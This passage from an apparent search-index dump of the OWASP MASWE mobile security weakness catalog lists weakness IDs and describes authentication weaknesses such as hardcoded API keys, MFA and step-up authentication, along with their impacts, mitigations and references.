MASWE-0082  Unsafe Handling of Data From Local Storage platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0085  Unsafe Dynamic Code Loading platform:android platform:ios MASVS-CODE-4 profile:L2 placeholderstatus:placeholder MASWE-0077  Running on a recent Platform Version Not Ensured platform:android platform:ios MASVS-CODE-1 profile:L2 placeholderstatus:placeholder MASWE-0078  Latest Platform Version Not Targeted platform:android platform:ios MASVS-CODE-1 profile:L2 placeholderstatus:placeholder MASWE-0075  Enforced Updating Not Implemented platform:android platform:ios MASVS-CODE-2 profile:L2 placeholderstatus:placeholder MASWE-0076  Dependencies with Known Vulnerabilities platform:android platform:ios MASVS-CODE-3 profile:L1 profile:L2 newstatus:new MASWE-0086  SQL Injection platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0079  Unsafe Handling of Data from the Network platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0081  Unsafe Handling Of Data From External Interfaces platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0088  Insecure Object Deserialization platform:android platform:ios MASVS-CODE-4 profile:L2 placeholderstatus:placeholder MASWE-0116  Compiler Provided Security Features Not Used platform:android platform:ios MASVS-CODE-3 profile:L2 placeholderstatus:placeholder MASWE-0080  Unsafe Handling of Data from Backups platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0084  Unsafe Handling of Data from IPC platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0051  Unprotected Open Ports platform:android platform:ios MASVS-NETWORK-1 profile:L2 newstatus:new MASWE-0047  Insecure Identity Pinning platform:android platform:ios MASVS-NETWORK-2 profile:L2 newstatus:new MASWE-0052  Insecure Certificate Validation platform:android platform:ios MASVS-NETWORK-1 profile:L1 profile:L2 newstatus:new MASWE-0049  Proven Networking APIs Not used platform:android platform:ios MASVS-NETWORK-1 profile:L2 newstatus:new MASWE-0048  Insecure Machine-to-Machine Communication platform:android platform:ios MASVS-NETWORK-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0050  Cleartext Traffic platform:android platform:ios MASVS-NETWORK-1 profile:L1 profile:L2 newstatus:new MASWE-0055  Sensitive Data Leaked via Screenshots platform:android platform:ios MASVS-PLATFORM-3 profile:L2 placeholderstatus:placeholder MASWE-0065  Sensitive Data Permanently Shared with Other Apps platform:android MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0056  Tapjacking Attacks platform:android platform:ios MASVS-PLATFORM-3 profile:L2 placeholderstatus:placeholder MASWE-0053  Sensitive Data Leaked via the User Interface platform:android platform:ios MASVS-PLATFORM-3 profile:L2 placeholderstatus:placeholder MASWE-0073  Insecure WebResourceResponse Implementations platform:android MASVS-PLATFORM-2 profile:L2 placeholderstatus:placeholder MASWE-0061  Insecure Use of App Extensions platform:ios MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0058  Insecure Deep Links platform:android platform:ios MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0071  WebViews Loading Content from Untrusted Sources platform:android platform:ios MASVS-PLATFORM-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0060  Insecure Use of UIActivity platform:ios MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0074  Web Content Debugging Enabled platform:android platform:ios MASVS-PLATFORM-2 profile:L2 placeholderstatus:placeholder MASWE-0063  Insecure Broadcast Receivers platform:android MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0062  Insecure Services platform:android MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0067  Debuggable Flag Not Disabled platform:android platform:ios MASVS-RESILIENCE-4 profile:R newstatus:new MASWE-0069  WebViews Allows Access to Local Resources platform:android platform:ios MASVS-PLATFORM-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0064  Insecure Content Providers platform:android MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0057  StrandHogg Attack / Task Affinity Vulnerability platform:android MASVS-PLATFORM-3 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0059  Use Of Unauthenticated Platform IPC platform:android platform:ios MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0070  JavaScript Loaded from Untrusted Sources platform:android platform:ios MASVS-PLATFORM-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0066  Insecure Intents platform:android MASVS-PLATFORM-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0054  Sensitive Data Leaked via Notifications platform:android platform:ios MASVS-PLATFORM-3 profile:L2 placeholderstatus:placeholder MASWE-0068  JavaScript Bridges in WebViews platform:android platform:ios MASVS-PLATFORM-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0072  Universal XSS platform:android platform:ios MASVS-PLATFORM-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0006  Sensitive Data Stored Unencrypted in Private Storage Locations platform:android platform:ios MASVS-STORAGE-1 profile:L2 newstatus:new MASWE-0002  Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations platform:android MASVS-STORAGE-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0001  Insertion of Sensitive Data into Logs platform:android platform:ios MASVS-STORAGE-2 profile:L1 profile:L2 profile:P newstatus:new MASWE-0004  Sensitive Data Not Excluded From Backup platform:android platform:ios MASVS-STORAGE-2 profile:L1 profile:L2 profile:P newstatus:new MASWE-0003  Backup Unencrypted platform:android MASVS-STORAGE-2 profile:L2 placeholderstatus:placeholder MASWE-0007  Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction platform:android MASVS-STORAGE-1 profile:L1 profile:L2 newstatus:new MASWE-0046  Crypto Keys Not Invalidated on New Biometric Enrollment platform:android platform:ios MASVS-AUTH-2 profile:L2 placeholderstatus:placeholder MASWE-0030  Re-Authenticates Not Triggered On Contextual State Changes platform:android platform:ios MASVS-AUTH-3 profile:L2 placeholderstatus:placeholder MASWE-0005  API Keys Hardcoded in the App Package platform:android platform:ios MASVS-AUTH-1 profile:L1 profile:L2 newstatus:new MASWE-0045  Fallback to Non-biometric Credentials Allowed for Sensitive Transactions platform:android platform:ios MASVS-AUTH-2 profile:L2 placeholderstatus:placeholder MASWE-0032  Platform-provided Authentication APIs Not Used platform:android platform:ios MASVS-AUTH-1 profile:L2 placeholderstatus:placeholder MASWE-0035  Passwordless Authentication Not Implemented platform:android platform:ios MASVS-AUTH-1 profile:L2 placeholderstatus:placeholder MASWE-0042  Authorization Enforced Only Locally Instead of on the Server-side platform:android platform:ios MASVS-AUTH-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0039  Shared Web Credentials and Website-association Not Implemented platform:android platform:ios MASVS-AUTH-1 profile:L2 placeholderstatus:placeholder MASWE-0034  Insecure Implementation of Confirm Credentials platform:android MASVS-AUTH-2 profile:L2 deprecatedstatus:deprecated MASWE-0043  App Custom PIN Not Bound to Platform KeyStore platform:android platform:ios MASVS-AUTH-2 profile:L2 placeholderstatus:placeholder MASWE-0041  Authentication Enforced Only Locally Instead of on the Server-side platform:android platform:ios MASVS-AUTH-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0038  Authentication Tokens Not Validated platform:android platform:ios MASVS-AUTH-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0029  Step-Up Authentication Not Implemented After Login platform:android platform:ios MASVS-AUTH-3 profile:L2 placeholderstatus:placeholder MASWE-0031  Insecure use of Android Protected Confirmation platform:android MASVS-AUTH-3 profile:L2 placeholderstatus:placeholder MASWE-0033  Authentication or Authorization Protocol Security Best Practices Not Followed platform:android platform:ios MASVS-AUTH-1 profile:L2 placeholderstatus:placeholder MASWE-0036  Authentication Material Stored Unencrypted on the Device platform:android platform:ios MASVS-AUTH-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0037  Authentication Material Sent over Insecure Connections platform:android platform:ios MASVS-AUTH-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0040  Insecure Authentication in WebViews platform:android platform:ios MASVS-AUTH-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0028  MFA Implementation Best Practices Not Followed platform:android platform:ios MASVS-AUTH-3 profile:L2 placeholderstatus:placeholder MASWE-0044  Biometric Authentication Can Be Bypassed platform:android platform:ios MASVS-AUTH-2 profile:L2 placeholderstatus:placeholder MASWE-0013  Hardcoded Cryptographic Keys in Use platform:android platform:ios MASVS-CRYPTO-2 deprecatedstatus:deprecated MASWE-0022  Predictable Initialization Vectors (IVs) platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0012  Insecure or Wrong Usage of Cryptographic Key platform:android platform:ios MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0015  Deprecated Android KeyStore Implementations platform:android MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0027  Improper Random Number Generation platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 newstatus:new MASWE-0010  Improper Cryptographic Key Derivation platform:android platform:ios MASVS-CRYPTO-2 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0021  Improper Hashing platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0011  Cryptographic Key Rotation Not Implemented platform:android platform:ios MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0019  Risky Cryptography Implementations platform:android platform:ios MASVS-CRYPTO-1 profile:L2 newstatus:new MASWE-0025  Improper Generation of Cryptographic Signatures platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0018  Cryptographic Keys Access Not Restricted platform:android platform:ios MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0016  Unsafe Handling of Imported Cryptographic Keys platform:android platform:ios MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0023  Risky Padding platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 newstatus:new MASWE-0026  Improper Verification of Cryptographic Signature platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 placeholderstatus:placeholder MASWE-0020  Improper Encryption platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 newstatus:new MASWE-0017  Cryptographic Keys Not Properly Protected on Export platform:android platform:ios MASVS-CRYPTO-2 profile:L2 placeholderstatus:placeholder MASWE-0009  Improper Cryptographic Key Generation platform:android platform:ios MASVS-CRYPTO-2 profile:L1 profile:L2 newstatus:new MASWE-0014  Cryptographic Keys Not Properly Protected at Rest platform:android platform:ios MASVS-CRYPTO-2 profile:L1 profile:L2 newstatus:new MASWE-0024  Improper Use of Message Authentication Code (MAC) platform:android platform:ios MASVS-CRYPTO-1 profile:L1 profile:L2 placeholderstatus:placeholder <p></p>","tags":[]},{"location":"MASWE/MASVS-AUTH/MASWE-0005/","title":"MASWE-0005: API Keys Hardcoded in the App Package","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1"]},{"location":"MASWE/MASVS-AUTH/MASWE-0005/#overview","title":"Overview","text":"<p>API keys hardcoded in the app package, source code, or compiled binaries, can be easily extracted through reverse engineering.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1"]},{"location":"MASWE/MASVS-AUTH/MASWE-0005/#impact","title":"Impact","text":"<p>Hardcoding API keys in the app can lead to a variety of security issues, including but not limited to:</p> <ul> <li>Financial Loss: Attackers can exploit the compromised hardcoded API keys to make unauthorized API calls and abuse services that are billed on a per-use basis (e.g., AI or ML API services), resulting in unexpected charges to the app owner.</li> <li>Compromise of System Integrity and Business Operations: Extracted API keys can give attackers unauthorized access to sensitive resources and services. This directly impacts developers and enterprises by compromising app integrity, privacy, and service continuity - potentially leading to disruptions such as Denial of Service (DoS) or service suspension due to policy violations. Such incidents can significantly impact the user experience, erode user trust, and negatively impact business reputation and operations.</li> <li>Bypass Protection Mechanism: Hardcoded API keys can make it easier to bypass app protection mechanisms. Attackers can use this to access restricted content, cheat in app functionality, or unlock features that are intended for purchase, impacting both revenue and user experience.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1"]},{"location":"MASWE/MASVS-AUTH/MASWE-0005/#modes-of-introduction","title":"Modes of Introduction","text":"<p>API keys can be hardcoded in several areas:</p> <ul> <li>App Source Code: directly embedded in the app source code.</li> <li>App Assets: included in files that are destined for the final deliverable app package (typically APK/IPA), such as configuration files, manifest files, and resource files.</li> <li>Libraries: configuration files or source code for third-party, first-party libraries or any other app dependencies.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1"]},{"location":"MASWE/MASVS-AUTH/MASWE-0005/#mitigations","title":"Mitigations","text":"<ul> <li>Use a stateful API service that provides secure authentication, client validation, and session controls. Implement dynamic tokens that expire after a reasonably short time (e.g., 1 hour). This can help reduce the impact of key exposure. Also, ensure proper error handling and logging to detect and respond to unauthorized access attempts. Consider using OAuth 2.0 and security libraries like AppAuth to simplify secure OAuth flows.</li> <li>If a stateful API service is not viable, consider using a stateless API service with a middleware solution (sometimes known as API proxy or API Gateway). This involves proxying requests between the app and API endpoint. Use JSON Web Tokens (JWT) and JSON Web Signature (JWS) to store the vulnerable static key server-side rather than in the application (client). Implement secure key management practices and consider using a cloud key management service.</li> <li>If API keys must be hardcoded, be sure to configure them with the minimum required permissions to reduce the impact in case of exposure. Many services allow you to create keys with restricted access, which limits the operations that can be performed.</li> <li>Consider using a Key Management Service to get API keys on runtime after validating app integrity.</li> <li>Regularly audit the codebase and dependencies for hardcoded sensitive data (e.g. using tools such as gitLeaks).</li> <li>Use white-box cryptography techniques to encrypt API keys and sensitive data within the app, ensuring that the cryptographic algorithms and keys remain protected even if the app is reverse-engineered.</li> <li>While not foolproof, and to be used as a last resort when no other secure options are available, code and resource obfuscation and encryption can deter attackers by making it more difficult to analyze your app and discover hardcoded secrets. Avoid custom implementations and use well-established solutions such as RASP (Runtime Application Self-Protection) which can ensure that the API keys are only fully assembled in memory when necessary, keeping them obfuscated or split across different components otherwise. RASP can also dynamically retrieve and manage keys securely at runtime by integrating with secure key management solutions.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1"]},{"location":"MASWE/MASVS-AUTH/MASWE-0028/","title":"MASWE-0028: MFA Implementation Best Practices Not Followed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0028</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0028/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. not using auto-fill</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0028/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>platform auto-fill from SMS</li> <li>use of Sign-in with Apple</li> <li>MFA best practices</li> <li>(IEEE) unreliable channels such as voice mails and phone numbers must be avoided</li> <li>is not enforced only locally but server-side</li> <li>check if relies on static responses from the remote endpoint such as <code>\"message\":\"Success\"</code></li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0028/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0029/","title":"MASWE-0029: Step-Up Authentication Not Implemented After Login","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0029</p>","tags":["android","ios","L2","maswe","masvs-auth-3","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0029/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>An example of step-up authentication is when a user is logged into their bank account (with or without MFA) and requests an action that is considered sensitive, such as the transfer of a large sum of money. In such cases, the user will be required to provide additional information to authenticate their identity (e.g. using MFA) and ensure only the legitimate user is requesting the action.</p>","tags":["android","ios","L2","maswe","masvs-auth-3","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0029/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>(ioXt) UP107 App shall re-authenticate the user when displaying sensitive PII data or conducting sensitive transactions.</li> <li>None</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-3","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0029/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/localauthentication</li> <li>https://auth0.com/blog/what-is-step-up-authentication-when-to-use-it/</li> <li>https://tdcolvin.medium.com/is-firebase-auth-secure-dace0563d41b</li> <li>https://github.com/WICG/trust-token-api</li> <li>https://blog.cloudflare.com/eliminating-captchas-on-iphones-and-macs-using-new-standard/</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-3","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0029/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-3","masvs-platform-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0030/","title":"MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0030</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0030/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Re-authentication means forcing a new login after e.g. timeout, changing state from running in the background to running in the foreground, remarkable changes in a user's location, profile, etc.</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0030/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>timeout</li> <li>changing state from running in the background to running in the foreground</li> <li>(IEEE) remarkable changes in a user's location</li> <li>ASVS V3.3 Session Logout and Timeout Requirements</li> <li>NIST 800-63</li> <li>etc.</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0030/#references","title":"References","text":"<ul> <li>https://developers.google.com/identity/sign-in/android/disconnect</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0030/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0031/","title":"MASWE-0031: Insecure use of Android Protected Confirmation","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0031</p>","tags":["android","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0031/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Android Protected Confirmation doesn't provide a secure information channel for the user. Don't use it to display sensitive information that you wouldn't ordinarily show on the user's device.</p>","tags":["android","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0031/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Android Protected Confirmation</li> </ul>","tags":["android","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0031/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","L2","maswe","masvs-auth-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0032/","title":"MASWE-0032: Platform-provided Authentication APIs Not Used","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0032</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0032/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>AKA don't roll your own authentication security. Platform-provided APIs are designed and implemented by experts who have deep knowledge of the platform's security features and considerations. These APIs often incorporate security best practices and are regularly updated to address new threats and vulnerabilities. Not using platform-provided authentication APIs in mobile apps can result in security vulnerabilities, inconsistent user experience, missed integration opportunities, and increased development and maintenance efforts.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0032/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>credential auto-fill to avoid copy/paste</li> <li>correct use of Android AccountManager (e.g. invoke a cloud-based service and don't store passwords on the device). AccountManager data stored in clear in some Android versions.</li> <li>use of CREATOR afterretrieving an account with AccountManager</li> <li>use of Authentication Services framework on iOS</li> <li>iOS Password AutoFill streamlines logging into web services at your domain. However, if you need to log into a third-party service, use ASWebAuthenticationSession instead</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0032/#references","title":"References","text":"<ul> <li>https://developer.android.com/privacy-and-security/security-tips#Credentials</li> <li>https://developer.apple.com/documentation/security/password_autofill</li> <li>https://developer.apple.com/videos/play/wwdc2017/206</li> <li>https://developer.android.com/guide/topics/text/autofill-optimize</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0032/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-code-3","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0033/","title":"MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0033</p>","tags":["android","ios","L2","maswe","masvs-auth-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0033/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>For example, when using oauth2, the app does not use PKCE, etc. See RFC-8252. Focus on client-side best practices.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0033/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>best practices from RFC-8252</li> <li>SSO -&gt; OpenID Connect (OIDC)</li> <li>use of Google Service Accounts</li> <li>use of RISC</li> <li>use of Apple Redirect extensions for Enterprise</li> <li>using use SFAuthenticationSession (deprecated) instead of ASWebAuthenticationSession</li> <li>secure mutual authentication using X.509v3 certificates</li> <li>use of context to add security to authentication e.g. via IP or location data</li> <li>set prefersEphemeralWebBrowserSession to true before calling start for a session on iOS</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0033/#references","title":"References","text":"<ul> <li>https://mobidev.biz/blog/single-sign-on-sso-implementation-benefits-enterprise</li> <li>https://developers.google.com/identity/protocols/risc</li> <li>https://developer.apple.com/documentation/authenticationservices/aswebauthenticationsession/3237231-prefersephemeralwebbrowsersessio?language=objc</li> <li>https://developer.apple.com/videos/play/tech-talks/301</li> <li>https://developers.google.com/identity/protocols/oauth2</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0033/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0034/","title":"MASWE-0034: Insecure Implementation of Confirm Credentials","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Deprecated Weakness</p> <p>This weakness is deprecated and should not be used anymore. Reason: Content overlap. Confirm Credentials is a form of local authentication that will have a dedicated MASTG test.</p> <p>Please check the following MASTG v2 weaknesses that cover this v1 weakness:</p> <ul> <li> Biometric Authentication Can Be Bypassed</li> </ul>","tags":["android","L2","maswe","masvs-auth-2","deprecated"]},{"location":"MASWE/MASVS-AUTH/MASWE-0035/","title":"MASWE-0035: Passwordless Authentication Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0035</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0035/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>there's no use of passwordless authentication mechanisms e.g. passkeys</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0035/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>passkeys or multi-device FIDO credentials</li> <li>WebAuthn/ASAuthorization</li> <li>use of Physical Security Keys which stored the public-private key pair on a physical medium, such as a security card or a USB key</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0035/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/authenticationservices/public-private_key_authentication</li> <li>https://www.w3.org/TR/webauthn-2/</li> <li>https://fidoalliance.org/white-paper-multi-device-fido-credentials/</li> <li>https://developers.google.com/identity/fido</li> <li>https://developers.google.com/identity/fido#what_are_passkeys</li> <li>https://fidoalliance.org/developers/</li> <li>https://fidoalliance.org/product-category/android-client/</li> <li>https://fidoalliance.org/product-category/ios-client/</li> <li>https://developer.apple.com/documentation/authenticationservices/public-private_key_authentication/supporting_passkeys</li> <li>https://techcommunity.microsoft.com/t5/azure-active-directory-identity/expansion-of-fido-standard-and-new-updates-for-microsoft/ba-p/3290633</li> <li>https://developer.apple.com/documentation/authenticationservices/public-private_key_authentication/supporting_security_key_authentication_using_physical_keys</li> <li>https://developer.apple.com/videos/play/wwdc2021/10106/</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0035/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0036/","title":"MASWE-0036: Authentication Material Stored Unencrypted on the Device","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0036</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0036/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>General authentication material management best practices. Note that API keys are covered separately.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0036/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>session IDs</li> <li>tokens</li> <li>passwords</li> <li>use of sign-in with 